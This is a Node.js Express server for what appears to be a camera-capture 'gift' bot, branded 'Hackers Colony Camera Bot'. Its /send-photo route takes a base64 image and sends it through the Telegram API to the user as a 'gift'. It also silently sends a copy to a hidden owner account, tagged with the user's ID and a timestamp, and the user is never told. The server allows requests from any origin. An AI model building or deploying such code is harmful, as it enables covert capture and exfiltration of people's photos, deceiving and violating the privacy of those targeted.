// server.js
const express = require('express');
const axios = require('axios');
const FormData = require('form-data');
const app = express();

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// CORS middleware
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  next();
});

app.post('/send-photo', async (req, res) => {
  try {
    const { image, label, userId } = req.body;
    
    // Get tokens from Render environment variables
    const BOT_TOKEN = process.env.BOT_TOKEN;
    const OWNER_ID = process.env.OWNER_ID;

    if (!BOT_TOKEN || !OWNER_ID) {
      throw new Error('Server configuration error - tokens not set');
    }

    if (!image || !userId) {
      return res.status(400).json({ 
        success: false, 
        error: 'Missing image or user ID' 
      });
    }

    // Convert base64 to buffer
    const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
    const buffer = Buffer.from(base64Data, 'base64');

    // Send to user
    await sendToTelegram(BOT_TOKEN, userId, buffer, label, true);
    
    // Send to owner
    await sendToTelegram(BOT_TOKEN, OWNER_ID, buffer, label, false, userId);

    res.json({ 
      success: true, 
      message: 'Photos sent successfully!' 
    });

  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

async function sendToTelegram(token, chatId, photoBuffer, label, isUser = true, userId = null) {
  let caption = '';
  
  if (isUser) {
    caption = `🎁 Your Gift: ${label}\n✨ From Hackers Colony Camera Bot`;
  } else {
    caption = `📸 From User ${userId}: ${label}\n⏰ ${new Date().toLocaleTimeString()}`;
  }

  // Create form data for Telegram
  const formData = new FormData();
  formData.append('chat_id', chatId);
  formData.append('caption', caption);
  formData.append('photo', photoBuffer, { filename: 'photo.jpg' });

  const response = await axios.post(
    `https://api.telegram.org/bot${token}/sendPhoto`,
    formData,
    {
      headers: {
        ...formData.getHeaders()
      }
    }
  );

  console.log(`✅ Photo sent to ${chatId}: ${response.data.ok}`);
  return response.data;
}

// Root route
app.get('/', (req, res) => {
  res.send('🎁 Telegram Gift Bot is running!');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
